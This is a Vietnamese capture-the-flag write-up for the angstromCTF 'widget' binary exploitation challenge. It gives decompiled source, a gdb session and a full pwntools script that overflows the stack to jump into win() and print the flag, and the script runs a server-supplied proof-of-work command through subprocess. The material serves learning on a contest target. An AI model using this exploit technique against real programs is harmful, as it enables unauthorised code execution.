# angstromctf - widget

## Source code

```c
int __fastcall win(const char *a1, const char *a2)
{
  char s[136]; // [rsp+10h] [rbp-90h] BYREF
  FILE *stream; // [rsp+98h] [rbp-8h]

  if ( strncmp(a1, "14571414c5d9fe9ed0698ef21065d8a6", 0x20uLL) )
    exit(1);
  if ( strncmp(a2, "willy_wonka_widget_factory", 0x1AuLL) )
    exit(1);
  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    puts("Error: missing flag.txt.");
    exit(1);
  }
  fgets(s, 128, stream);
  return puts(s);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-24h] BYREF
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  __gid_t rgid; // [rsp+28h] [rbp-8h]
  unsigned int i; // [rsp+2Ch] [rbp-4h]

  setbuf(_bss_start, 0LL);
  setbuf(stdin, 0LL);
  rgid = getegid();
  setresgid(rgid, rgid, rgid);
  if ( called )
    exit(1);
  called = 1;
  printf("Amount: ");
  v4 = 0;
  __isoc99_scanf("%d", &v4);
  getchar();
  if ( v4 < 0 )
    exit(1);
  printf("Contents: ");
  read(0, buf, v4);
  for ( i = 0; (int)i < v4; ++i )
  {
    if ( buf[i] == 'n' )
    {
      printf("bad %d\n", i);
      exit(1);
    }
  }
  printf("Your input: ");
  return printf(buf);                
}
```
## Analysis

```java
$ file widget
widget: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e017550bf60e3908f52086421525669f7ca5a934, for GNU/Linux 3.2.0, not stripped
$ checksec widget
[*] '/amstrongctf/widget/widget'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Ta sẽ đi qua một chút về luồng hoạt động của chương trình. Đầu tiên từ hàm main: main sẽ kiểm tra biến called = 0 thì cho qua sau đó lại set called = 1, chưa hiểu để làm gì. Sau đó sẽ yêu cầu mình nhập một số amount gì đó rồi đọc đúng lượng amount này byte nhập từ bàn phím. Cuối cùng kiểm tra và thoát chương trình nếu trong chuỗi ta vừa nhập có ký tự 'n'. 

Nếu nhìn sơ qua thì ta chỉ có thể phát hiện được lỗi fmt ở cuối hàm main, nhưng không =)) hãy nhớ là ta có thể nhập input có độ lớn tùy ý nhờ biến amount. Vì vậy đây có thêm cả lỗi bof. Trong hàm win sẽ kiểm tra 2 chuỗi đúng rồi mới in ra flag cho mình. 

Kịch bản đầu tiên là mình sẽ leak libc ra ngoài rồi tìm các vùng có thể đọc ghi được, nhờ hàm puts để ghi 2 chuỗi của hàm win vào đấy, chạy lại hàm main, overflow cho đến saved rip tới win và lây flag.

Tuy nhiên nó chỉ nằm ở mục lý thuyết thôi =)) khi thực hành thì mình k thể chạy lại hàm main do không thể điều khiển biến called và set nó về 0, do đó chương trình sẽ thoát ngay lập tức. Nhảy qua đó và gọi tới vị trí khác của main cũng không được vì sẽ gặp lỗi xmm0.

Chỉ còn một cách là nhảy qua bước kiểm tra của win. Nhưng nó vẫn có vấn đề

```java
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffe12932e30│+0x0000: 0x000000000000000a ("\n"?)   ← $rsp
0x00007ffe12932e38│+0x0008: 0x0000000000401372  →  <main+0> endbr64
0x00007ffe12932e40│+0x0010: 0x0000000112932f20
0x00007ffe12932e48│+0x0018: 0x00007ffe12932f38  →  0x00007ffe12933336  →  "/mnt/c/ctf/amstrongctf/widget/widget_patched"
0x00007ffe12932e50│+0x0020: 0x0000000000000000
0x00007ffe12932e58│+0x0028: 0x0cbffd677e425127
0x00007ffe12932e60│+0x0030: 0x00007ffe12932f38  →  0x00007ffe12933336  →  "/mnt/c/ctf/amstrongctf/widget/widget_patched"
0x00007ffe12932e68│+0x0038: 0x0000000000401372  →  <main+0> endbr64
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401315 <win+127>        lea    rax, [rip+0xd2a]        # 0x402046
     0x40131c <win+134>        mov    rdi, rax
     0x40131f <win+137>        call   0x401180 <fopen@plt>
 →   0x401324 <win+142>        mov    QWORD PTR [rbp-0x8], rax
     0x401328 <win+146>        cmp    QWORD PTR [rbp-0x8], 0x0
     0x40132d <win+151>        jne    0x401348 <win+178>
     0x40132f <win+153>        lea    rax, [rip+0xd19]        # 0x40204f
     0x401336 <win+160>        mov    rdi, rax
     0x401339 <win+163>        call   0x401100 <puts@plt>
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "widget_patched", stopped 0x401324 in win (), reason: SIGBUS
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401324 → win()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  c

Program terminated with signal SIGBUS, Bus error.
The program no longer exists.
```
Mình sẽ bị SIGBUS như trên tại <win + 142> do địa chỉ rbp không hợp lệ. Để solve thì chỉ cần tìm địa chỉ nào đấy có thể đọc ghi là được. PIE disable nên địa chỉ của binary sẽ không bị thay đổi

```java
...
0x0000000000404000 0x0000000000405000 0x0000000000004000 rw- /mnt/c/ctf/amstrongctf/widget/widget_patched
...
```
Full script: 

```python
#!/usr/bin/env python3

from pwn import *
import subprocess

context.binary = exe = ELF("./widget_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote('challs.actf.co', 31320)
    return r

def main():
    r = conn()
    r.recvuntil(b"proof of work: ")
    foo = r.recvline().decode()
    resultCapcha = subprocess.getoutput(foo)
    r.sendline(resultCapcha)
    payload = b"A" * (40-8)
    payload += p64(0x0000000000405000)
    payload += p64(exe.sym['win']+117)

    r.sendlineafter(b"Amount: ", b'55')
    r.sendlineafter(b"Contents: ", payload)
    r.interactive()

if __name__ == "__main__":
    main()
```
Có một đoạn dùng để lấy capcha do server nó bắt vậy, để chống brute force chứ k liên quan gì đến chall này hết =))

```java
$ ./solve.py DEBUG
[+] Opening connection to challs.actf.co on port 31320: Done
...
[*] Switching to interactive mode
[DEBUG] Received 0x5c bytes:
    b'Your input: AAAAAAAAAAAAAAAAAAAAAAAAAAAA7actf{y0u_f0und_a_usefu1_widg3t!_30db5c45a07ac981}\n'
    b'\n'
Your input: AAAAAAAAAAAAAAAAAAAAAAAAAAAA7actf{y0u_f0und_a_usefu1_widg3t!_30db5c45a07ac981}

[*] Got EOF while reading in interactive
$
```
`flag: actf{y0u_f0und_a_usefu1_widg3t!_30db5c45a07ac981}`